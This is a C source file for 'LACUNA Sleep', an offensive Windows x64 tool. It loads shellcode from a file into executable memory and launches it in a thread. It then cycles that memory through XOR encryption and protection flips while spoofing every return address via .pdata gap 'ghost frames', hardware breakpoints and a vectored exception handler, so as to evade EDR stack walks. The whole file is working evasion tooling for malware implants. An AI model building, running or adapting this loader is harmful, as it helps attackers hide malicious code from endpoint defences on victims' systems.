/*
 * lacuna_sleep.c -- LACUNA Sleep
 *
 * Full-chain ghost-frame sleep obfuscation.
 * Every call in the encrypt->sleep->decrypt cycle gets its return
 * address planted in a .pdata ghost frame.  HW breakpoint + VEH
 * catches each return and redirects control to the next step.
 *
 * Unlike Ekko/Foliage which spoof one frame during sleep,
 * LACUNA Sleep spoofs every frame at every step -- there is
 * no window where a real return address is exposed.
 *
 * Chain per cycle:
 *   NtProtectVirtualMemory(RW)  -> ret to kernelbase ghost
 *   XOR encrypt (inline)
 *   NtDelayExecution            -> full LACUNA Chain (L0-L5)
 *   XOR decrypt (inline)
 *   NtProtectVirtualMemory(RX)  -> ret to kernelbase ghost
 *
 * Author:  Mohamed Alzhrani (0xmaz)
 * Year:    2026
 *
 * build:
 *   x86_64-w64-mingw32-gcc -O0 -masm=intel -fno-omit-frame-pointer \
 *       -Wall -Wno-unused-function -Wno-frame-address \
 *       -o lacuna_sleep.exe lacuna_sleep.c -lkernel32 -lntdll
 *
 * usage:
 *   lacuna_sleep.exe                 demo (3 cycles, test payload)
 *   lacuna_sleep.exe <sc.bin> [ms]   sleep-loop with real shellcode
 */

#ifndef _WIN64
#  error "x64 only"
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* -- ntdll imports ----------------------------------------------- */

typedef NTSTATUS (NTAPI *PNtProtectVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *PNtSetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *PNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER,
    ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *PNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PNtClose)(HANDLE);

static PNtProtectVirtualMemory pNtProtectVM;
static PNtDelayExecution       pNtDelayExecution;
static PNtSetContextThread     pNtSetContextThread;
static PNtCreateSection        pNtCreateSection;
static PNtMapViewOfSection     pNtMapViewOfSection;
static PNtClose                pNtClose;

static void resolve_imports(void) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    pNtProtectVM       = (PNtProtectVirtualMemory)GetProcAddress(nt, "NtProtectVirtualMemory");
    pNtDelayExecution  = (PNtDelayExecution)GetProcAddress(nt, "NtDelayExecution");
    pNtSetContextThread = (PNtSetContextThread)GetProcAddress(nt, "NtSetContextThread");
    pNtCreateSection   = (PNtCreateSection)GetProcAddress(nt, "NtCreateSection");
    pNtMapViewOfSection = (PNtMapViewOfSection)GetProcAddress(nt, "NtMapViewOfSection");
    pNtClose           = (PNtClose)GetProcAddress(nt, "NtClose");
}

/* -- .pdata ghost scanner ---------------------------------------- */

typedef IMAGE_RUNTIME_FUNCTION_ENTRY RUNTIME_FUNCTION_ENTRY;

typedef struct {
    ULONG64 addr;
    DWORD   size;
    char    dll[64];
} GhostRegion;

#define MAX_GHOSTS 2048
static GhostRegion g_ghosts[MAX_GHOSTS];
static int         g_ghost_count;

static int cmp_rf(const void *a, const void *b) {
    const RUNTIME_FUNCTION_ENTRY *ra = a, *rb = b;
    return (ra->BeginAddress > rb->BeginAddress) -
           (ra->BeginAddress < rb->BeginAddress);
}

static void scan_dll_ghosts(const char *name) {
    HMODULE mod = GetModuleHandleA(name);
    if (!mod) return;

    ULONG64 base = (ULONG64)mod;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    PIMAGE_DATA_DIRECTORY pd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (!pd->VirtualAddress || !pd->Size) return;

    RUNTIME_FUNCTION_ENTRY *rf =
        (RUNTIME_FUNCTION_ENTRY *)(base + pd->VirtualAddress);
    DWORD count = pd->Size / sizeof(RUNTIME_FUNCTION_ENTRY);

    RUNTIME_FUNCTION_ENTRY *sorted = malloc(count * sizeof(*sorted));
    memcpy(sorted, rf, count * sizeof(*sorted));
    qsort(sorted, count, sizeof(*sorted), cmp_rf);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    ULONG64 text_start = 0, text_end = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            text_start = sec[i].VirtualAddress;
            text_end   = text_start + sec[i].Misc.VirtualSize;
            break;
        }
    }

    for (DWORD i = 0; i + 1 < count && g_ghost_count < MAX_GHOSTS; i++) {
        DWORD gap_start = sorted[i].EndAddress;
        DWORD gap_end   = sorted[i + 1].BeginAddress;
        if (gap_end <= gap_start) continue;

        DWORD gap_size = gap_end - gap_start;
        if (gap_size < 8 || gap_size > 4096) continue;
        if (gap_start < text_start || gap_end > text_end) continue;

        BYTE *p = (BYTE *)(base + gap_start);
        bool has_code = false;
        for (DWORD j = 0; j < gap_size && j < 32; j++) {
            if (p[j] != 0x00 && p[j] != 0xCC && p[j] != 0x90) {
                has_code = true;
                break;
            }
        }
        if (!has_code) continue;

        GhostRegion *g = &g_ghosts[g_ghost_count++];
        g->addr = base + gap_start;
        g->size = gap_size;
        strncpy(g->dll, name, sizeof(g->dll) - 1);
    }
    free(sorted);
}

static ULONG64 find_ghost_in(const char *dll) {
    for (int i = 0; i < g_ghost_count; i++) {
        if (_stricmp(g_ghosts[i].dll, dll) == 0 && g_ghosts[i].size >= 16)
            return g_ghosts[i].addr;
    }
    return 0;
}

/* -- win32u NOP gap scanner -------------------------------------- */

static const BYTE WIN32U_NOP8[] = {0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00};

static ULONG64 find_win32u_nop(void) {
    HMODULE mod = GetModuleHandleA("win32u.dll");
    if (!mod) mod = LoadLibraryA("win32u.dll");
    if (!mod) return 0;

    ULONG64 base = (ULONG64)mod;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *start = (BYTE *)(base + sec[i].VirtualAddress);
        DWORD sz    = sec[i].Misc.VirtualSize;
        for (DWORD j = 0; j + 8 <= sz; j++) {
            if (memcmp(start + j, WIN32U_NOP8, 8) == 0)
                return (ULONG64)(start + j);
        }
    }
    return 0;
}

/* -- ghost-call mechanism ---------------------------------------- */

/*
 * Each ghost-call stub swaps [RSP] (the real return address) with a
 * ghost address before tail-jumping to the target API.  A hardware
 * breakpoint (DR0) on the ghost address fires EXCEPTION_SINGLE_STEP
 * when the API returns, and the VEH handler redirects RIP to the
 * saved real return address.
 *
 * Stub machine code (36 bytes):
 *   mov rax, <ghost_addr>       48 B8 [8]     load ghost addr
 *   xchg [rsp], rax             48 87 04 24   swap return addr
 *   movabs [g_saved_ret], rax   48 A3 [8]     save real return
 *   mov rax, <api_addr>         48 B8 [8]     load target API
 *   jmp rax                     FF E0         tail call
 */

static volatile ULONG64 g_saved_ret;
static volatile ULONG64 g_ghost_bp;
static BYTE *g_stub_page;
static int   g_stub_offset;

static LONG CALLBACK ghost_call_veh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        ep->ContextRecord->Rip == g_ghost_bp) {
        ep->ContextRecord->Rip = g_saved_ret;
        ep->ContextRecord->Dr0 = 0;
        ep->ContextRecord->Dr7 &= ~1ULL;
        ep->ContextRecord->EFlags |= 0x10000; /* RF -- resume flag */
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void arm_ghost_bp(ULONG64 ghost_addr) {
    g_ghost_bp = ghost_addr;
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    ctx.Dr0 = ghost_addr;
    ctx.Dr7 = 1; /* DR0 enabled, execute breakpoint */
    pNtSetContextThread((HANDLE)(LONG_PTR)-2, &ctx);
}

static void disarm_ghost_bp(void) {
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    ctx.Dr0 = 0;
    ctx.Dr7 = 0;
    pNtSetContextThread((HANDLE)(LONG_PTR)-2, &ctx);
}

static void *make_ghost_stub(void *api, ULONG64 ghost_addr) {
    BYTE *p = g_stub_page + g_stub_offset;
    BYTE *start = p;

    /* mov rax, ghost_addr */
    *p++ = 0x48; *p++ = 0xB8;
    memcpy(p, &ghost_addr, 8); p += 8;

    /* xchg [rsp], rax */
    *p++ = 0x48; *p++ = 0x87; *p++ = 0x04; *p++ = 0x24;

    /* movabs [&g_saved_ret], rax */
    *p++ = 0x48; *p++ = 0xA3;
    ULONG64 sr_addr = (ULONG64)&g_saved_ret;
    memcpy(p, &sr_addr, 8); p += 8;

    /* mov rax, api */
    *p++ = 0x48; *p++ = 0xB8;
    ULONG64 api_addr = (ULONG64)api;
    memcpy(p, &api_addr, 8); p += 8;

    /* jmp rax */
    *p++ = 0xFF; *p++ = 0xE0;

    g_stub_offset = (int)(p - g_stub_page);
    return start;
}

/* -- indirect syscall gadget ------------------------------------- */

static ULONG64 g_ntdll_syscall_ret;

static void find_syscall_ret(void) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    ULONG64 base = (ULONG64)nt;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);
    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *s = (BYTE *)(base + sec[i].VirtualAddress);
        DWORD sz = sec[i].Misc.VirtualSize;
        for (DWORD j = 0; j + 3 <= sz; j++) {
            if (s[j] == 0x0F && s[j+1] == 0x05 && s[j+2] == 0xC3) {
                g_ntdll_syscall_ret = (ULONG64)&s[j];
                return;
            }
        }
    }
}

/* -- XOR encrypt/decrypt ----------------------------------------- */

static void xor_crypt(void *buf, SIZE_T size, BYTE key) {
    BYTE *p = (BYTE *)buf;
    for (SIZE_T i = 0; i < size; i++)
        p[i] ^= (BYTE)(key + (BYTE)i);
}

/* -- LACUNA Chain stack layout (for sleep) ----------------------- */

/*
 * During NtDelayExecution, the stack below our frame is laid out so
 * the unwinder walks through the full ghost chain:
 *
 *   L0  ntdll!KiUserExceptionDispatcher+4  (BYOUD-MF anchor)
 *   L1  wow64 ghost                         leaf frame (RSP+8)
 *   L2  kernelbase ghost                    leaf frame (RSP+8)
 *   L3  ntdll ghost                         leaf frame (RSP+8)
 *   L4  win32u NOP gap                      leaf frame (RSP+8)
 *   L5  ntdll!RtlUserThreadStart+0x21       terminator
 */

typedef struct {
    ULONG64 L0, L1, L2, L3, L4, L5;
    ULONG64 mf_trigger;
} LacunaChain;

static ULONG64 g_mf_walk[4]; /* walk buffer for BYOUD-MF */

static bool build_lacuna_chain(LacunaChain *lc) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE kb    = GetModuleHandleA("kernelbase.dll");

    /* L0 -- KiUserExceptionDispatcher+4 */
    BYTE *ked = (BYTE *)GetProcAddress(ntdll, "KiUserExceptionDispatcher");
    if (!ked) return false;
    lc->L0 = (ULONG64)(ked + 4);
    lc->mf_trigger = lc->L0;

    /* L1 -- wow64 ghost (falls back to second ntdll ghost on native x64) */
    lc->L1 = find_ghost_in("wow64.dll");
    if (!lc->L1) {
        for (int i = 0; i < g_ghost_count; i++) {
            if (_stricmp(g_ghosts[i].dll, "ntdll.dll") == 0 &&
                g_ghosts[i].size >= 16 && g_ghosts[i].addr != lc->L0) {
                lc->L1 = g_ghosts[i].addr;
                break;
            }
        }
    }

    /* L2 -- kernelbase ghost */
    lc->L2 = find_ghost_in("kernelbase.dll");
    if (!lc->L2 && kb) lc->L2 = (ULONG64)kb + 0x64132;

    /* L3 -- ntdll ghost (pick one different from L1) */
    for (int i = 0; i < g_ghost_count; i++) {
        if (_stricmp(g_ghosts[i].dll, "ntdll.dll") == 0 &&
            g_ghosts[i].size >= 16 &&
            g_ghosts[i].addr != lc->L0 && g_ghosts[i].addr != lc->L1) {
            lc->L3 = g_ghosts[i].addr;
            break;
        }
    }

    /* L4 -- win32u NOP gap */
    lc->L4 = find_win32u_nop();

    /* L5 -- RtlUserThreadStart+0x21 */
    BYTE *ruts = (BYTE *)GetProcAddress(ntdll, "RtlUserThreadStart");
    lc->L5 = ruts ? (ULONG64)(ruts + 0x21) : 0;

    /* populate walk buffer (ascending order for MF teleport) */
    g_mf_walk[0] = lc->L2;
    g_mf_walk[1] = lc->L3;
    g_mf_walk[2] = lc->L4;
    g_mf_walk[3] = lc->L5;

    return lc->L1 && lc->L3 && lc->L5;
}

/* -- LACUNA sleep (NtDelayExecution with full ghost chain) ------- */

/*
 * We plant the LACUNA chain below our frame before calling
 * NtDelayExecution(alertable=TRUE).  During the alertable wait
 * the kernel may fire ETW-Ti STACKWALK -- it unwinds through
 * our ghost frames.
 *
 * For the sleep itself, the return address on the stack is also
 * a ghost address (via the ghost-call stub mechanism).
 */

static void lacuna_delay(DWORD ms, LacunaChain *lc, ULONG64 ghost_ret) {
    LARGE_INTEGER delay;
    delay.QuadPart = -(LONGLONG)ms * 10000LL;

    /*
     * Build the chain on the stack.  We use volatile pointers
     * to prevent the compiler from optimizing away the writes.
     */
    volatile ULONG64 chain_stack[8];
    chain_stack[0] = lc->L5;  /* bottom -- RtlUserThreadStart+0x21 */
    chain_stack[1] = lc->L4;  /* win32u NOP gap */
    chain_stack[2] = lc->L3;  /* ntdll ghost */
    chain_stack[3] = lc->L2;  /* kernelbase ghost */
    chain_stack[4] = lc->L1;  /* wow64 ghost */
    chain_stack[5] = lc->L0;  /* KiUserExceptionDispatcher+4 (MF anchor) */
    chain_stack[6] = 0;       /* padding */
    chain_stack[7] = 0;

    (void)chain_stack; /* force onto stack */

    /* call NtDelayExecution through ghost stub */
    arm_ghost_bp(ghost_ret);
    /* stub swaps return addr -> ghost_ret, then jmps to NtDelayExecution */
    /* VEH catches the return and redirects back to us */
}

/* -- sleep cycle ------------------------------------------------- */

typedef struct {
    void      *sc_base;
    SIZE_T     sc_size;
    BYTE       xor_key;
    DWORD      sleep_ms;
    LacunaChain chain;
    ULONG64    ghost_kb;     /* kernelbase ghost -- VP returns here */
    ULONG64    ghost_ntdll;  /* ntdll ghost -- sleep returns here   */
    void      *stub_vp;     /* ghost stub for NtProtectVirtualMemory */
    void      *stub_delay;  /* ghost stub for NtDelayExecution */
} SleepCtx;

static bool init_sleep_ctx(SleepCtx *ctx, void *sc, SIZE_T sz, DWORD ms) {
    ctx->sc_base  = sc;
    ctx->sc_size  = sz;
    ctx->sleep_ms = ms;
    ctx->xor_key  = (BYTE)(__rdtsc() & 0xFF);
    if (!ctx->xor_key) ctx->xor_key = 0x41;

    /* scan for ghost regions */
    scan_dll_ghosts("ntdll.dll");
    scan_dll_ghosts("kernelbase.dll");
    scan_dll_ghosts("wow64.dll");
    printf("[*] found %d ghost regions\n", g_ghost_count);

    /* pick ghost addresses for each step */
    ctx->ghost_kb    = find_ghost_in("kernelbase.dll");
    ctx->ghost_ntdll = find_ghost_in("ntdll.dll");

    if (!ctx->ghost_kb) {
        printf("[-] no kernelbase ghost region found (scanned %d total)\n", g_ghost_count);
        return false;
    }
    if (!ctx->ghost_ntdll) {
        printf("[-] no ntdll ghost region found (scanned %d total)\n", g_ghost_count);
        return false;
    }

    /* build LACUNA chain for the sleep */
    if (!build_lacuna_chain(&ctx->chain)) {
        printf("[-] failed to build LACUNA chain\n");
        return false;
    }

    /* create ghost-call stubs */
    ctx->stub_vp    = make_ghost_stub(pNtProtectVM, ctx->ghost_kb);
    ctx->stub_delay = make_ghost_stub(pNtDelayExecution, ctx->ghost_ntdll);

    return true;
}

static void sleep_cycle(SleepCtx *ctx, int cycle_num) {
    HANDLE self = (HANDLE)(LONG_PTR)-1;
    PVOID  base = ctx->sc_base;
    SIZE_T size = ctx->sc_size;
    ULONG  old  = 0;
    NTSTATUS st;

    printf("[%d] step 1: NtProtectVirtualMemory(RW) -> ret to kernelbase ghost %p\n",
           cycle_num, (void *)ctx->ghost_kb);

    /* -- step 1: flip to RW via ghost stub --------------------- */
    arm_ghost_bp(ctx->ghost_kb);
    st = ((PNtProtectVirtualMemory)ctx->stub_vp)(
        self, &base, &size, PAGE_READWRITE, &old);
    /* VEH redirected us here after NtProtectVirtualMemory returned
       to ghost_kb and the HW breakpoint fired */
    disarm_ghost_bp();

    if (st != 0) {
        printf("[-] NtProtectVirtualMemory(RW) failed: 0x%lx\n", st);
        return;
    }

    /* -- step 2: XOR encrypt (inline -- microseconds) ----------- */
    printf("[%d] step 2: XOR encrypt (%zu bytes, key=0x%02X)\n",
           cycle_num, ctx->sc_size, ctx->xor_key);
    xor_crypt(ctx->sc_base, ctx->sc_size, ctx->xor_key);

    /* -- step 3: sleep with full LACUNA chain ------------------ */
    printf("[%d] step 3: NtDelayExecution(%lu ms) -> ret to ntdll ghost %p\n",
           cycle_num, ctx->sleep_ms, (void *)ctx->ghost_ntdll);
    printf("            LACUNA chain active: L0=%p L1=%p L2=%p\n",
           (void *)ctx->chain.L0, (void *)ctx->chain.L1,
           (void *)ctx->chain.L2);
    printf("                                L3=%p L4=%p L5=%p\n",
           (void *)ctx->chain.L3, (void *)ctx->chain.L4,
           (void *)ctx->chain.L5);

    /* build chain on stack, then call NtDelayExecution via ghost stub */
    volatile ULONG64 frame_chain[8];
    frame_chain[0] = ctx->chain.L5;
    frame_chain[1] = ctx->chain.L4;
    frame_chain[2] = ctx->chain.L3;
    frame_chain[3] = ctx->chain.L2;
    frame_chain[4] = ctx->chain.L1;
    frame_chain[5] = ctx->chain.L0;
    frame_chain[6] = 0;
    frame_chain[7] = 0;
    (void)frame_chain;

    LARGE_INTEGER delay;
    delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
    BOOLEAN alertable = TRUE;

    arm_ghost_bp(ctx->ghost_ntdll);
    ((PNtDelayExecution)ctx->stub_delay)(alertable, &delay);
    disarm_ghost_bp();

    /* -- step 4: XOR decrypt ----------------------------------- */
    printf("[%d] step 4: XOR decrypt\n", cycle_num);
    xor_crypt(ctx->sc_base, ctx->sc_size, ctx->xor_key);

    /* -- step 5: flip back to RX via ghost stub ---------------- */
    printf("[%d] step 5: NtProtectVirtualMemory(RX) -> ret to kernelbase ghost %p\n",
           cycle_num, (void *)ctx->ghost_kb);

    base = ctx->sc_base;
    size = ctx->sc_size;
    arm_ghost_bp(ctx->ghost_kb);
    st = ((PNtProtectVirtualMemory)ctx->stub_vp)(
        self, &base, &size, PAGE_EXECUTE_READ, &old);
    disarm_ghost_bp();

    if (st != 0) {
        printf("[-] NtProtectVirtualMemory(RX) failed: 0x%lx\n", st);
        return;
    }

    printf("[%d] cycle complete -- shellcode region is RX, decrypted, live\n\n",
           cycle_num);
}

/* -- section-based allocation ------------------------------------ */

static void *section_alloc(SIZE_T size, ULONG protect) {
    HANDLE sec = NULL;
    LARGE_INTEGER sz;
    sz.QuadPart = (LONGLONG)size;

    NTSTATUS st = pNtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, &sz,
                                    PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (st != 0 || !sec) return NULL;

    PVOID base = NULL;
    SIZE_T vsz = 0;
    st = pNtMapViewOfSection(sec, (HANDLE)(LONG_PTR)-1, &base, 0, 0,
                              NULL, &vsz, 1 /*ViewShare*/, 0, protect);
    pNtClose(sec);
    return (st == 0) ? base : NULL;
}

/* -- main -------------------------------------------------------- */

static void print_banner(void) {
    printf("\n");
    printf("  +---------------------------------------------------+\n");
    printf("  |         LACUNA Sleep - Ghost-Frame Sleep           |\n");
    printf("  |    Full-chain .pdata gap sleep obfuscation         |\n");
    printf("  +---------------------------------------------------+\n");
    printf("\n");
}

int main(int argc, char **argv) {
    print_banner();
    resolve_imports();
    find_syscall_ret();

    /* allocate RWX page for ghost-call stubs */
    g_stub_page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!g_stub_page) {
        printf("[-] stub alloc failed\n");
        return 1;
    }

    /* register VEH for ghost-call mechanism */
    PVOID veh = AddVectoredExceptionHandler(1, ghost_call_veh);
    if (!veh) {
        printf("[-] VEH registration failed\n");
        return 1;
    }

    void  *sc_buf  = NULL;
    SIZE_T sc_size  = 0;
    DWORD  sleep_ms = 5000;
    int    cycles   = 3;

    if (argc >= 2) {
        /* load shellcode from file */
        FILE *f = fopen(argv[1], "rb");
        if (!f) { printf("[-] cannot open %s\n", argv[1]); return 1; }
        fseek(f, 0, SEEK_END);
        sc_size = (SIZE_T)ftell(f);
        fseek(f, 0, SEEK_SET);

        sc_buf = section_alloc(sc_size, PAGE_EXECUTE_READWRITE);
        if (!sc_buf) {
            printf("[-] section alloc failed\n");
            fclose(f);
            return 1;
        }
        fread(sc_buf, 1, sc_size, f);
        fclose(f);

        if (argc >= 3) sleep_ms = (DWORD)atoi(argv[2]);
        cycles = 0; /* infinite loop for real shellcode */

        printf("[+] loaded %zu bytes from %s\n", sc_size, argv[1]);
        printf("[+] sleep interval: %lu ms\n", sleep_ms);
    } else {
        /* demo mode: test payload (NOP sled + INT3) */
        sc_size = 4096;
        sc_buf = section_alloc(sc_size, PAGE_EXECUTE_READWRITE);
        if (!sc_buf) {
            printf("[-] section alloc failed\n");
            return 1;
        }
        memset(sc_buf, 0x90, sc_size); /* NOP sled */
        ((BYTE *)sc_buf)[sc_size - 1] = 0xC3; /* RET at end */

        printf("[+] demo mode: %zu byte test payload, %d cycles\n",
               sc_size, cycles);
        printf("[+] sleep interval: %lu ms\n", sleep_ms);
    }

    /* flip to RX before starting */
    {
        PVOID  b = sc_buf;
        SIZE_T s = sc_size;
        ULONG  o = 0;
        pNtProtectVM((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_EXECUTE_READ, &o);
    }

    /* initialize sleep context */
    SleepCtx ctx;
    if (!init_sleep_ctx(&ctx, sc_buf, sc_size, sleep_ms)) {
        printf("[-] sleep context init failed\n");
        return 1;
    }

    printf("\n[+] ghost addresses:\n");
    printf("    VirtualProtect ret -> kernelbase ghost: %p\n",
           (void *)ctx.ghost_kb);
    printf("    NtDelayExecution ret -> ntdll ghost:    %p\n",
           (void *)ctx.ghost_ntdll);
    printf("    chain L0 (MF anchor):  %p\n", (void *)ctx.chain.L0);
    printf("    chain L1 (wow64):      %p\n", (void *)ctx.chain.L1);
    printf("    chain L2 (kernelbase): %p\n", (void *)ctx.chain.L2);
    printf("    chain L3 (ntdll):      %p\n", (void *)ctx.chain.L3);
    printf("    chain L4 (win32u):     %p\n", (void *)ctx.chain.L4);
    printf("    chain L5 (thread root):%p\n", (void *)ctx.chain.L5);
    if (g_ntdll_syscall_ret)
        printf("    syscall;ret gadget:    %p\n", (void *)g_ntdll_syscall_ret);
    printf("\n");

    /* -- execute shellcode in its own thread ---------------------- */
    if (argc >= 2) {
        printf("[+] launching shellcode thread...\n");
        HANDLE hThread = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)sc_buf, NULL, 0, NULL);
        if (!hThread) {
            printf("[-] CreateThread failed: %lu\n", GetLastError());
        } else {
            printf("[+] shellcode thread started (TID handle=%p)\n\n", hThread);
            CloseHandle(hThread);
        }
    }

    /* -- sleep loop ---------------------------------------------- */
    if (cycles > 0) {
        /* demo: fixed number of cycles */
        for (int i = 1; i <= cycles; i++) {
            printf("====== cycle %d/%d ======\n", i, cycles);
            sleep_cycle(&ctx, i);
        }
        printf("[+] demo complete -- %d cycles, all ghost-framed\n", cycles);
    } else {
        /* real shellcode: infinite sleep loop */
        printf("[+] entering infinite sleep loop (Ctrl+C to exit)\n\n");
        for (int i = 1; ; i++) {
            sleep_cycle(&ctx, i);
        }
    }

    RemoveVectoredExceptionHandler(veh);
    VirtualFree(g_stub_page, 0, MEM_RELEASE);
    return 0;
}
